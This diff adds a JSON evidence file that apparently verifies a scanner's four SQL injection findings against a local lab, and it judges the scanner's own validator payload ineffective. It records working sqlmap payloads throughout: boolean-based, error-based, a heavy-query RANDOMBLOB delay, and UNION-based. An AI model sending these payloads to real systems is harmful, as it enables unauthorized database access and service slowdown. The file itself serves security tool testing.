@@ -1,0 +1,167 @@
+{
+  "script": "independent verification: curl only, no whaxon imports",
+  "job": "evidence/whaxon-run/job-66b0be3c50f2.json",
+  "lab": "http://127.0.0.1:8100",
+  "findings_checked": 4,
+  "results": [
+    {
+      "finding_seq": 0,
+      "whaxon_reported": {
+        "kind": "sqli",
+        "severity": "critical"
+      },
+      "sqlmap_technique": "boolean-based",
+      "stored_payload": "id=1' AND 2679=2679 AND 'DNHo'='DNHo",
+      "V1_recorded_payload": {
+        "produces_db_error": false,
+        "body_identical_to_benign_baseline": true,
+        "elapsed_s": 0.001482,
+        "baseline_elapsed_s": 0.00345
+      },
+      "V2_false_condition": {
+        "payload": "1' AND 2679=2680 AND 'DNHo'='DNHo",
+        "produces_db_error": false,
+        "body_identical_to_benign_baseline": false,
+        "differs_from_true_condition": true,
+        "elapsed_s": 0.001334
+      },
+      "V3_whaxon_validator_payload": {
+        "payload": "`+HERP",
+        "produces_db_error": false,
+        "body_identical_to_whaxon_baseline": true,
+        "whaxon_baseline_body_excerpt": "<html><body><h1>low</h1><p>ID: not in the database</p></body></html>",
+        "elapsed_s": 0.001274,
+        "whaxon_baseline_elapsed_s": 0.001628
+      },
+      "V4_minimal_breakout_payload": {
+        "payload": "1'",
+        "produces_db_error": true,
+        "body_identical_to_whaxon_baseline": false,
+        "elapsed_s": 0.001747,
+        "interpretation": "a payload that merely breaks out of the quoting produces a baseline differential and a database error on this endpoint"
+      }
+    },
+    {
+      "finding_seq": 1,
+      "whaxon_reported": {
+        "kind": "sqli",
+        "severity": "critical"
+      },
+      "sqlmap_technique": "error-based",
+      "stored_payload": "id=1' AND 2445=JSON_EXTRACT(CHAR(123,125),CHAR(113,118,98,122,113)||(SELECT (CASE WHEN (2445=2445) THEN 1 ELSE 0 END))||",
+      "V1_recorded_payload": {
+        "produces_db_error": true,
+        "body_identical_to_benign_baseline": false,
+        "elapsed_s": 0.001628,
+        "baseline_elapsed_s": 0.00137
+      },
+      "V2_false_condition": {
+        "payload": "1' AND 2445=JSON_EXTRACT(CHAR(123,125),CHAR(113,118,98,122,113)||(SELECT (CASE WHEN (2445=2446) THEN 1 ELSE 0 END))||CHA",
+        "produces_db_error": true,
+        "body_identical_to_benign_baseline": false,
+        "differs_from_true_condition": true,
+        "elapsed_s": 0.001495
+      },
+      "V3_whaxon_validator_payload": {
+        "payload": "`+HERP",
+        "produces_db_error": false,
+        "body_identical_to_whaxon_baseline": true,
+        "whaxon_baseline_body_excerpt": "<html><body><h1>low</h1><p>ID: not in the database</p></body></html>",
+        "elapsed_s": 0.001501,
+        "whaxon_baseline_elapsed_s": 0.001375
+      },
+      "V4_minimal_breakout_payload": {
+        "payload": "1'",
+        "produces_db_error": true,
+        "body_identical_to_whaxon_baseline": false,
+        "elapsed_s": 0.00127,
+        "interpretation": "a payload that merely breaks out of the quoting produces a baseline differential and a database error on this endpoint"
+      }
+    },
+    {
+      "finding_seq": 2,
+      "whaxon_reported": {
+        "kind": "sqli",
+        "severity": "critical"
+      },
+      "sqlmap_technique": "time/heavy-query",
+      "stored_payload": "id=1' AND 2136=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'RGep'='RGep",
+      "V1_recorded_payload": {
+        "produces_db_error": false,
+        "body_identical_to_benign_baseline": false,
+        "elapsed_s": 4.989754,
+        "baseline_elapsed_s": 0.001342
+      },
+      "V2_false_condition": {
+        "payload": "1' AND 2136=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'RGep'='RGep",
+        "produces_db_error": false,
+        "body_identical_to_benign_baseline": false,
+        "differs_from_true_condition": false,
+        "elapsed_s": 2.694123
+      },
+      "V3_whaxon_validator_payload": {
+        "payload": "`+HERP",
+        "produces_db_error": false,
+        "body_identical_to_whaxon_baseline": true,
+        "whaxon_baseline_body_excerpt": "<html><body><h1>low</h1><p>ID: not in the database</p></body></html>",
+        "elapsed_s": 0.00239,
+        "whaxon_baseline_elapsed_s": 0.00106
+      },
+      "V4_minimal_breakout_payload": {
+        "payload": "1'",
+        "produces_db_error": true,
+        "body_identical_to_whaxon_baseline": false,
+        "elapsed_s": 0.001325,
+        "interpretation": "a payload that merely breaks out of the quoting produces a baseline differential and a database error on this endpoint"
+      }
+    },
+    {
+      "finding_seq": 3,
+      "whaxon_reported": {
+        "kind": "sqli",
+        "severity": "critical"
+      },
+      "sqlmap_technique": "union",
+      "stored_payload": "id=1' UNION ALL SELECT NULL,CHAR(113,118,98,122,113)||CHAR(69,86,66,72,83,118,115,104,80,99,82,113,66,106,102,83,101,112",
+      "V1_recorded_payload": {
+        "produces_db_error": false,
+        "body_identical_to_benign_baseline": false,
+        "elapsed_s": 0.001205,
+        "baseline_elapsed_s": 0.001242
+      },
+      "V2_false_condition": {
+        "payload": "1' UNION ALL SELECT NULL,CHAR(113,118,98,122,113)||CHAR(69,86,66,72,83,118,115,104,80,99,82,113,66,106,102,83,101,112,75",
+        "produces_db_error": false,
+        "body_identical_to_benign_baseline": false,
+        "differs_from_true_condition": false,
+        "elapsed_s": 0.001365
+      },
+      "V3_whaxon_validator_payload": {
+        "payload": "`+HERP",
+        "produces_db_error": false,
+        "body_identical_to_whaxon_baseline": true,
+        "whaxon_baseline_body_excerpt": "<html><body><h1>low</h1><p>ID: not in the database</p></body></html>",
+        "elapsed_s": 0.001129,
+        "whaxon_baseline_elapsed_s": 0.00104
+      },
+      "V4_minimal_breakout_payload": {
+        "payload": "1'",
+        "produces_db_error": true,
+        "body_identical_to_whaxon_baseline": false,
+        "elapsed_s": 0.001208,
+        "interpretation": "a payload that merely breaks out of the quoting produces a baseline differential and a database error on this endpoint"
+      }
+    }
+  ],
+  "conclusions": {
+    "V1_every_recorded_payload_reproduces_a_detectable_effect": true,
+    "V2_boolean_differential_exists_where_applicable": true,
+    "V3_validator_payload_incapable": true,
+    "V4_a_better_payload_would_have_worked": true,
+    "structural_notes": [
+      "boolean-based: a successful payload returns the same body as the benign baseline by construction; only the false condition differs",
+      "time/heavy-query: the observable effect is a delay, not a body change",
+      "only error-based and union techniques leave a differential marker in the body"
+    ]
+  }
+}
